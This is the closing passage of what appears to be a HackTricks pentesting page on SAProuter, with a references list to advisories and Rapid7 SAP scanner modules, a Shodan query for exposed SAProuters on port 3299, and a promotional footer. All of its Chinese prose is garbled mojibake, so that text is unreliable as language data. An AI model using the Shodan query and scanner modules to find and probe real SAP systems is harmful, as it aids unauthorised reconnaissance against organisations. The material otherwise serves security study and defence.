æˆ‘å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©é˜æ˜ä¸saprouteréƒ¨ç½²ç›¸å…³çš„é£é™©ï¼Œä»¥åŠSAPå®‰å…¨æ€§ã€‚

**å‚è€ƒèµ„æ–™**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWS hackingï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
